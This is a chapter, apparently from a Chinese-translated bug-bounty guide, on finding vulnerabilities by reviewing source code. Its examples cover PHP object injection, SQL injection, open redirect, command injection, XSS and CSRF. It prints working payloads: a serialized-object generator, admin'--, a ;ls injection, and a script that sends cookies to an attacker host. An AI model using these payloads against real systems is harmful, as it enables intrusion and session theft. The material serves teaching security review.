# 第二十二章：进行代码审查

![](img/chapterart.png)

你有时会遇到你正在攻击的应用程序的源代码。例如，你可能能够从 Web 应用程序中提取 JavaScript 代码，在侦查过程中找到存储在服务器上的脚本，或者从 Android 应用程序中获取 Java 源代码。如果是这样，你真幸运！审查代码是发现应用程序漏洞的最佳方法之一。

与其通过尝试不同的有效负载和攻击来测试应用程序，你可以通过查看应用程序源代码来直接定位不安全的编程问题。源代码审查不仅是发现漏洞的更快方式，还能帮助你将来学习如何安全编程，因为你将看到他人的错误。

通过学习漏洞如何在源代码中表现出来，你可以培养出对漏洞发生的方式和原因的直觉。学习进行源代码审查最终会帮助你成为一个更优秀的黑客。

本章介绍了一些策略，帮助你开始进行代码审查。我们将讨论你应该关注的内容，并通过示例练习帮助你入门。

请记住，大多数情况下，你不需要成为某种编程语言的专家才能进行代码审查。只要你理解一种编程语言，你就可以利用直觉审查用不同语言编写的各种软件。但理解目标语言和架构将帮助你发现更细微的漏洞。

## 白盒与黑盒测试

你可能听到过网络安全行业的人提到黑盒测试和白盒测试。*黑盒测试*是从外部测试软件。就像真实的攻击者一样，这些测试者对应用程序的内部逻辑了解不多。相比之下，*灰盒测试*，测试者对应用程序的内部有有限的了解。在*白盒审查*中，测试者可以完全访问软件的源代码和文档。

通常，漏洞赏金猎取是一个黑盒过程，因为你无法访问应用程序的源代码。但如果你能够识别应用程序的开源组件或找到其源代码，你就可以将你的猎取转变为更有利的灰盒或白盒测试。

## 快速方法：grep 是你最好的朋友

寻找源代码漏洞的方法有很多，取决于你想多深入。我们将从我所说的“我能找到什么就拿什么”的策略开始。如果你想在短时间内最大化发现漏洞的数量，这个策略非常有效。这些技巧快速，并且通常会发现一些最严重的漏洞，但它们往往忽略了更微妙的漏洞。

### 危险模式

使用`grep`命令，查找已知的危险函数、字符串、关键字和编码模式。例如，PHP 中使用`eval()`函数可能表明存在代码注入漏洞。

要查看如何操作，假设你搜索了`eval()`并调出了以下代码片段：

```
<?php [...] class UserFunction { private $hook;    function __construct(){ [...] }    function __wakeup(){ 1 if (isset($this->hook)) eval($this->hook); } } [...]2 $user_data = unserialize($_COOKIE['data']); [...]
?>
```

在这个例子中，`$_COOKIE['data']` 2 获取名为`data`的用户 cookie。`eval()`函数 1 执行传入字符串表示的 PHP 代码。组合起来，这段代码获取名为`data`的用户 cookie 并对其进行反序列化。应用程序还定义了一个名为`UserFunction`的类，当反序列化时，它会对实例的`$hook`属性存储的字符串运行`eval()`。

这段代码包含了一个不安全的反序列化漏洞，导致远程代码执行（RCE）。原因是应用程序从用户的 cookie 中获取用户输入，并将其直接传递给`unserialize()`函数。结果，用户可以通过构造一个序列化对象并将其传递到`data` cookie 中，使`unserialize()`启动应用程序可以访问的任何类。

你可以利用这个反序列化漏洞实现 RCE，因为它将用户提供的对象传递给`unserialize()`，而`UserFunction`类会对用户提供的输入执行`eval()`，这意味着用户可以让应用程序执行任意的用户代码。要利用这个 RCE，你只需要将`data` cookie 设置为一个序列化的`UserFunction`对象，并将`hook`属性设置为你想要的 PHP 代码。你可以使用以下代码生成序列化对象：

```
<?php class UserFunction { private $hook = "phpinfo();"; } print urlencode(serialize(new UserFunction));
?>
```

将结果字符串传递到`data` cookie 中将导致代码`phpinfo();`被执行。这个例子摘自 OWASP 的 PHP 对象注入指南，链接为[`owasp.org/www-community/vulnerabilities/PHP_Object_Injection`](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)。你可以在第十四章了解更多关于不安全反序列化漏洞的内容。

当你刚开始审查一段源代码时，集中精力查找对用户控制数据使用的危险函数。表 22-1 列出了几个需要注意的危险函数的例子。这些函数的存在并不能保证存在漏洞，但可以提醒你可能存在的漏洞。

表 22-1：潜在的危险函数

| **语言** | **函数** | **可能的漏洞** |
| --- | --- | --- |
| PHP | `eval()`，`assert()`，`system()`，`exec()`，`shell_exec()`，`passthru()`，`popen()`，反引号`` (` ```CODE``` `) ``，`include()`，`require()` | 如果对未经清理的用户输入使用，可能导致远程代码执行（RCE）。`eval()`和`assert()`执行传入的 PHP 代码，而`system()`，`exec()`，`shell_exec()`，`passthru()`，`popen()`和反引号执行系统命令。`include()`和`require()`可以通过将远程 PHP 脚本的 URL 传递给函数来执行 PHP 代码。 |
| PHP | `unserialize()` | 如果对未经清理的用户输入使用，将导致不安全的反序列化。 |
| Python | `eval()`, `exec()`, `os.system()` | 如果在未经清理的用户输入上使用，可能会导致 RCE。 |
| Python | `pickle.loads()`, `yaml.load()` | 如果在未经清理的用户输入上使用，可能会导致不安全的反序列化。 |
| JavaScript | `document.write()`, `document.writeln` | 如果在未经清理的用户输入上使用，可能会导致 XSS。 这些函数会写入 HTML 文档。因此，如果攻击者能够控制传入该函数的值，那么攻击者就可以在受害者的页面上写入 JavaScript 代码。 |
| JavaScript | `document.location.href()` | 如果在未经清理的用户输入上使用，可能会导致开放重定向。`document.location.href()`会更改用户页面的 URL 位置。 |
| Ruby | `System()`, `exec()`, `%x()`, backticks `` (` ```CODE``` `) `` | 如果在未经清理的用户输入上使用，可能会导致 RCE。 |
| Ruby | `Marshall.load()`, `yaml.load()` | 如果在未经清理的用户输入上使用，可能会导致不安全的反序列化。 |

### 泄露的密钥和弱加密

查找泄露的密钥和凭证。有时，开发者犯了将 API 密钥、加密密钥、数据库密码等密钥硬编码进源代码的错误。当这些源代码被攻击者泄露时，攻击者可以利用这些凭证访问公司的资产。例如，我曾在 Web 应用的 JavaScript 文件中发现硬编码的 API 密钥。

你可以通过搜索诸如`key`、`secret`、`password`、`encrypt`、`API`、`login`或`token`等关键词来查找这些问题。你还可以根据你寻找的凭证密钥格式，使用正则表达式搜索十六进制或 Base64 字符串。例如，GitHub 访问令牌是 40 个字符的小写十六进制字符串。类似`[a-f0-9]{40}`的搜索模式将能在源代码中找到它们。这个搜索模式匹配的是长度为 40 个字符且只包含数字和十六进制字母*a*到*f*的字符串。

在搜索时，你可能会遇到类似这样的一段代码，写在 Python 中：

```
import requests1 GITHUB_ACCESS_TOKEN = "0518fb3b4f52a1494576eee7ed7c75ae8948ce70"
headers = {"Authorization": "token {}".format(GITHUB_ACCESS_TOKEN), \
"Accept": "application/vnd.github.v3+json"}
api_host = "https://api.github.com"2 usernames = ["vickie"] # List users to analyze
def request_page(path): resp = requests.Response() try: resp = requests.get(url=path, headers=headers, timeout=15, verify=False) except: pass return resp.json()3 def find_repos(): # Find repositories owned by the users. for username in usernames: path = "{}/users/{}/repos".format(api_host, username) resp = request_page(path) for repo in resp: print(repo["name"])
if __name__ == "__main__": find_repos()
```

这个 Python 程序接收 GitHub 用户的用户名，并打印出该用户所有仓库的名称。这可能是一个内部脚本，用于监控组织的资产。但该代码包含了硬编码的凭证，因为开发者将 GitHub 访问令牌硬编码进了源代码。一旦源代码被泄露，API 密钥就变成了公开信息。

熵扫描可以帮助你找到不遵循特定格式的密钥。在计算中，*熵*是衡量某物有多么随机和不可预测的指标。例如，一个由单一重复字符组成的字符串，如`aaaaa`，具有非常低的熵。而一个包含更多字符集的较长字符串，如`wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`，则具有较高的熵。因此，熵是寻找高度随机和复杂字符串的好工具，这些字符串通常表示一个密钥。Dylan Ayrey 开发的 TruffleHog 工具（[`github.com/trufflesecurity/truffleHog/`](https://github.com/trufflesecurity/truffleHog/)）就是利用正则表达式和熵扫描来寻找密钥的工具。

最后，检查是否使用了弱加密算法或哈希算法。这个问题在黑盒测试中很难发现，但在审查源代码时容易发现。注意查看诸如弱加密密钥、易破解的加密算法和弱哈希算法等问题。可以通过`grep`查找弱算法的名称，如 ECB、MD4 和 MD5。应用程序中可能会有与这些算法同名的函数，例如`ecb()`、`create_md4()`或`md5_hash()`。它可能还会有以算法名称命名的变量，如`ecb_key`等。弱哈希算法的影响取决于它们的使用场景。如果它们用于哈希那些不被视为安全敏感的值，那么它们的使用影响将比用于哈希密码时要小。

### 新补丁和过时的依赖项

如果你有源代码的提交或变更历史，你还可以关注最近的代码修复和安全补丁。最近的变更尚未经受时间考验，更容易包含漏洞。查看已实现的保护机制，并检查是否能够绕过它们。

同时，查找程序的依赖项，检查它们是否过时。可以使用`grep`查找你所用编程语言中的特定代码导入函数，如`import`、`require`和`dependencies`等关键字。然后，研究它们使用的版本，看看是否在 CVE 数据库中与它们相关的漏洞（[`cve.mitre.org/`](https://cve.mitre.org/)）。扫描应用程序中的脆弱依赖项的过程被称为*软件组成分析（**SCA）*。OWASP 的 Dependency-Check 工具（[`owasp.org/www-project-dependency-check/`](https://owasp.org/www-project-dependency-check/)）可以帮助你自动化这个过程。也有功能更强大的商业工具。

### 开发者评论

你还应该查找开发者评论、隐藏的调试功能以及不小心暴露的配置文件。这些是开发者常常忽略的资源，往往会让应用程序处于危险状态。

开发者评论可以指出明显的编程错误。例如，一些开发者喜欢在代码中添加评论来提醒自己有未完成的任务。他们可能会写出类似这样的评论，指出代码中的漏洞：

```
# todo: Implement CSRF protection on the change_password endpoint.
```

你可以通过查找每种编程语言的注释符号来找到开发者评论。在 Python 中，注释符号是`#`。在 Java、JavaScript 和 C++中，注释符号是`//`。你还可以在源代码中查找诸如*todo*、*fix*、*completed*、*config*、*setup*和*removed*等词汇。

### 调试功能、配置文件和端点

隐藏的调试功能常常导致权限提升，因为它们本来是为了让开发者绕过保护机制。你经常可以在特殊端点找到它们，因此可以搜索像 `HTTP`、`HTTPS`、`FTP` 和 `dev` 这样的字符串。例如，你可能会在代码的某个地方发现一个指向管理员面板的 URL：

```
http://dev.example.com/admin?debug=1&password=password # Access debug panel
```

配置文件可以让你获得更多关于目标应用的信息，并可能包含凭据。你也可以在源代码中查找指向配置文件的文件路径。配置文件通常具有文件扩展名 *.conf*、*.env*、*.cnf*、*.cfg*、*.cf*、*.ini*、*.sys* 或 *.plist*。

接下来，查找其他路径、已弃用的端点以及正在开发中的端点。这些端点是用户在正常使用应用时可能不会遇到的。但是，如果它们有效并且被攻击者发现，它们可能会导致认证绕过和敏感信息泄露等漏洞，具体取决于暴露的端点。你可以搜索那些指示 URL 的字符串和字符，比如*HTTP*、*HTTPS*、斜杠（/）、URL 参数标记（?）、文件扩展名（*.php*、*.html*、*.js*、*.json*）等。

## 详细方法

如果你有更多时间，可以通过更全面的源代码审查来补充快速的技术，以便发现微妙的漏洞。不要逐行阅读整个代码库，而是尝试这些策略来最大化你的效率。

### 重要功能

在阅读源代码时，关注重要的功能，比如认证、密码重置、状态变更操作和敏感信息读取。例如，你可能需要仔细查看这个用 Python 编写的登录函数：

```
def login(): query = "SELECT * FROM users WHERE username = '" + \ 1 request.username + "' AND password = '" + \ request.password + "';" authed_user = database_call(query)2 login_as(authed_user)
```

这个函数通过使用用户提供的用户名和密码构造 SQL 查询来在数据库中查找用户 1。如果存在具有指定用户名和密码的用户，函数将登录该用户 2。

这段代码包含了一个经典的 SQL 注入漏洞示例。在 1 处，应用程序使用用户输入来构建 SQL 查询，但没有对输入进行任何清理。攻击者可以通过输入 `admin'--` 作为用户名来登录为管理员用户。之所以有效，是因为查询会变成以下内容：

```
SELECT password FROM users WHERE username = 'admin' --' AND password = '';
```

应用程序的哪些部分很重要取决于组织的优先级。同时，审查重要组件与应用程序其他部分的交互。这将帮助你了解攻击者的输入如何影响应用程序的不同部分。

### 用户输入

另一种方法是仔细阅读处理用户输入的代码。用户输入，比如 HTTP 请求参数、HTTP 头、HTTP 请求路径、数据库条目、文件读取和文件上传，提供了攻击者利用应用程序漏洞的切入点。这有助于发现常见的漏洞，如存储型 XSS、SQL 注入和 XXE。

关注处理用户输入的代码部分将为识别潜在的危险提供一个良好的起点。确保还要检查用户输入是如何存储或传输的。最后，查看应用程序的其他部分是否使用了之前处理过的用户输入。你可能会发现相同的用户输入在应用程序的不同组件中有不同的交互方式。

例如，以下片段接受用户输入。PHP 变量 `$_GET` 包含在 URL 查询字符串中提交的参数，因此变量 `$_GET['next']` 指的是名为 `next` 的 URL 查询参数的值：

```
<?php [...] if ($logged_in){ 1 $redirect_url = $_GET['next']; 2 header("Location: ". $redirect_url); exit; } [...]
?>
```

这个参数存储在 `$redirect_url` 变量中 1。然后，`header()` PHP 函数将响应头 `Location` 设置为该变量 2。`Location` 头部控制浏览器重定向用户到哪里。这意味着用户将被重定向到 `next` URL 参数指定的位置。

这个代码片段中的漏洞是一个开放重定向。`next` URL 查询参数用于在登录后重定向用户，但应用程序在重定向之前没有验证该 URL。它只是获取 URL 查询参数 `next` 的值，并相应地设置响应头。

即便是这个功能的更强大版本，也可能包含漏洞。看看这个代码片段：

```
<?php
[...]
if ($logged_in){ $redirect_url = $_GET['next']; 1 if preg_match("/example.com/", $redirect_url){ header("Location: ". $redirect_url); exit; }
}
[...]
?>
```

现在代码包含了一些输入验证：`preg_match(``PATTERN``,` `STRING``)` PHP 函数检查 `STRING` 是否匹配正则表达式模式 `PATTERN` 1。大概这个模式会确保页面重定向到一个合法的位置。但这段代码仍然包含开放重定向。虽然应用程序现在在重定向用户之前验证了重定向 URL，但这种验证并不完全。它只检查重定向 URL 是否包含字符串 *example.com*。如第七章所述，攻击者可以轻松绕过此保护，使用诸如 *attacker.com/example.com* 或 *example.com.attacker.com* 的重定向 URL。

让我们看一个通过追踪用户输入可以发现漏洞的实例。`parse_url(``URL, COMPONENT``)` PHP 函数解析一个 URL 并返回指定的 URL 组件。例如，这个函数会返回字符串`/index.html`。在这个例子中，它返回的是 `PHP_URL_PATH`，即输入 URL 的文件路径部分：

```
parse_url("https://www.example.com/index.html", PHP_URL_PATH)
```

你能在以下 PHP 代码片段中找出漏洞吗？

```
<?php [...]1 $url_path = parse_url($_GET['download_file'], PHP_URL_PATH);2 $command = 'wget -o stdout https://example.com' . $url_path;3 system($command, $output);4 echo "<h1> You requested the page:" . $url_path . "</h1>"; echo $output;  [...]
?>
```

这个页面包含一个命令注入漏洞和一个反射型 XSS 漏洞。通过关注应用程序使用用户提供的 `download_file` 参数的地方，你可以发现这些漏洞。

假设这个页面位于*https://example.com/download*。这段代码获取`download_file` URL 查询参数，并解析 URL 以提取其路径部分 1。然后，服务器下载位于*example.com*服务器上的文件，文件路径与`download_file` URL 中的路径匹配 2。例如，访问这个 URL 将会下载文件*https://example.com/abc*：

```
https://example.com/download?download_file=https://example.com/abc
```

PHP 中的`system()`命令执行系统命令，`system(``COMMAND, OUTPUT``)`将会把`COMMAND`的输出存储到变量`OUTPUT`中。这个程序将用户输入传递给变量`$command`，然后再传递给`system()`函数 3。这意味着用户可以通过注入载荷到`$url_path`中来执行任意代码。用户只需在请求页面时，像这样修改`download_file`的 GET 参数：

```
https://example.com/download?download_file=https://example.com/download;ls
```

然后，应用程序通过直接用户输入在网页上显示一条消息 4。攻击者可以在`download_file`的 URL 路径部分嵌入一个 XSS 载荷，并在受害者访问构造的 URL 后让它反射到受害者的页面上。可以通过以下代码片段生成这个漏洞 URL。（注意，第二行为了显示的需要换行到第三行。）

```
<?php $exploit_string = "<script>document.location='http://attacker_server_ip/cookie_stealer .php?c='+document.cookie;</script>"; echo "https://example.com/" . $exploit_string;
?>
```

## 练习：发现漏洞

这些技巧中的一些可能显得抽象，所以我们通过一个用 Python 编写的示例程序来一步步讲解，这将帮助你练习本章介绍的技巧。最终，审查源代码是一项需要练习的技能。你查看易受攻击的代码越多，越能熟练地发现漏洞。

以下程序存在多个问题。看看你能发现多少个：

```
import requests
import urllib.parse as urlparse
from urllib.parse import parse_qs
api_path = "https://api.example.com/new_password"
user_data = {"new_password":"", "csrf_token":""}
def get_data_from_input(current_url): # get the URL parameters # todo: we might want to stop putting user passwords 1 # and tokens in the URL! This is really not secure.  # todo: we need to ask for the user's current password  # before they can change it! url_object = urlparse.urlparse(current_url) query_string = parse_qs(url_object.query) try: user_data["new_password"] = query_string["new_password"][0] user_data["csrf_token"] = query_string["csrf_token"][0] except: pass
def new_password_request(path, user_data): if user_data["csrf_token"]: 2 validate_token(user_data["csrf_token"]) resp = requests.Response() try: resp = requests.post(url=path, headers=headers, timeout=15, verify=False, data=user_data) print("Your new password is set!") except: pass
def validate_token(csrf_token):  if (csrf_token == session.csrf_token): pass else: raise Exception("CSRF token incorrect. Request rejected.")
def validate_referer(): 3 # todo: implement actual referer check! Now the function is a placeholder. 4 if self.request.referer: return True else: throw_error("Referer incorrect. Request rejected.")
if __name__ == "__main__": validate_referer() get_data_from_input(self.request.url) new_password_request(api_path, user_data)
```

我们首先来看看这个程序是如何工作的。它应该接受一个`new_password` URL 参数，用于为用户设置新密码。它解析`new_password`和`csrf_token`的 URL 参数。然后，它验证 CSRF 令牌，并执行 POST 请求来更改用户的密码。

这个程序有多个问题。首先，它包含了几条暴露开发者的评论 1。评论指出更改用户密码的请求是通过 GET 请求发起的，并且用户的新密码和 CSRF 令牌都通过 URL 传递。通过 URL 传递机密信息是不好的做法，因为它们可能会暴露给浏览器历史记录、浏览器扩展和流量分析提供商。这就给攻击者窃取这些机密信息提供了可能性。接下来，另一条开发者评论指出更改密码时不需要用户的当前密码！第三条暴露的评论则指出 CSRF 的 referer 检查功能不完整 4。

你可以自己查看该程序使用了两种类型的 CSRF 保护，但它们都不完整。Referer 检查功能仅检查是否存在 referer，而不检查 referer URL 是否来自合法网站。接下来，该网站实现了不完整的 CSRF 令牌验证。它仅在 URL 中提供了`csrf_token`参数时，才会检查 CSRF 令牌是否有效。攻击者只需提供一个不包含`csrf_token`参数，或者包含空白`csrf_token`的 URL，就能够执行 CSRF 攻击，进而更改用户密码，举例如下：

```
https://example.com/change_password?new_password=abc&csrf_token=
https://example.com/change_password?new_password=abc
```

代码审查是发现漏洞的有效方法，因此，如果你在黑客攻击过程中能够随时提取源代码，就应该深入源代码，看看能发现什么。手动代码审查可能非常耗时。使用静态分析安全测试（SAST）工具是自动化这个过程的好方法。现有许多开源和商业的 SAST 工具，功能各异，因此，如果你对代码分析感兴趣，并且参与了许多源代码项目，可能需要考虑使用你喜欢的 SAST 工具。
